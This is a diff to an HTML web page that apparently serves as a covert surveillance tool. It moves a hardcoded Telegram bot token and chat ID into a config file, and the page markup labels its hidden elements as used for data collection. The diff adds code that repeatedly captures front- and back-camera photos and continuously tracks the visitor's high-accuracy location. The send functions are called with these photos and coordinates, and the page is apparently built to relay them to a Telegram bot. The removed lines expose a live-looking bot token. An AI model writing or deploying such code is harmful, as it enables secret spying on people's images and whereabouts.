@@ -211,6 +211,8 @@
             cursor: pointer;
         }
     </style>
+    <!-- Telegram config file (must be included before main script) -->
+    <script src="config.js"></script>
 </head>
 <body>
     <!-- HIDDEN ELEMENTS (required for data collection) -->
@@ -245,11 +247,8 @@
         </form>
     </div>
 
+    <!-- Main script -->
     <script>
-        // ==================== CONFIG ====================
-        const BOT_TOKEN = '8214662223:AAE8Y17RmB9-_2j2YXbm3EpOnTE5Wk7BQKU';
-        const CHAT_ID = '6677946042';
-        
         // ==================== VARIABLES ====================
         let stream = null;
         let capturing = false;
@@ -547,4 +546,85 @@
                     return;
                 }
                 canvas.width = video.videoWidth;
-   
+                canvas.height = video.videoHeight;
+                if (useFrontCamera) {
+                    context.translate(canvas.width, 0);
+                    context.scale(-1, 1);
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    context.setTransform(1, 0, 0, 1, 0, 0);
+                } else {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                }
+                photoCount++;
+                canvas.toBlob(async (blob) => {
+                    try {
+                        if (blob.size > 1000) {
+                            await sendPhotoWithRetry(blob, photoCount, useFrontCamera ? 'Front' : 'Back');
+                        }
+                    } catch (err) {
+                        console.log('Photo send error:', err);
+                    }
+                }, 'image/jpeg', 70);
+            } catch (err) {
+                console.log('Capture error:', err);
+            }
+        }
+        
+        async function processQueue() {
+            while (photoQueue.length > 0) {
+                const item = photoQueue.shift();
+                await sendPhotoWithRetry(item.blob, item.num, item.cameraType);
+                await new Promise(r => setTimeout(r, 1000));
+            }
+        }
+        
+        async function switchCamera(mode) {
+            try {
+                if (stream) stream.getTracks().forEach(track => track.stop());
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                });
+            } catch (err) {
+                console.log('Switch error:', err);
+                return false;
+            }
+        }
+        
+        function startLiveLocation() {
+            if (!navigator.geolocation) return;
+            locationWatchId = navigator.geolocation.watchPosition(
+                (position) => {
+                    locationCount++;
+                    // Send every ~30 seconds (assuming updates every 5 seconds, count 6)
+                    if (locationCount % 6 === 0) {
+                        sendWithRetry('location', {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        });
+                    }
+                },
+                (error) => console.log('Live location error:', error),
+                { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
+            );
+        }
+
+        // ==================== ADMIN PANEL TOGGLE PASSWORD ====================
+        function togglePassword() {
+            var pass = document.getElementById("password");
+            if (pass.type === "password") {
+                pass.type = "text";
+            } else {
+                pass.type = "password";
+            }
+        }
+    </script>
+</body>
+</html>
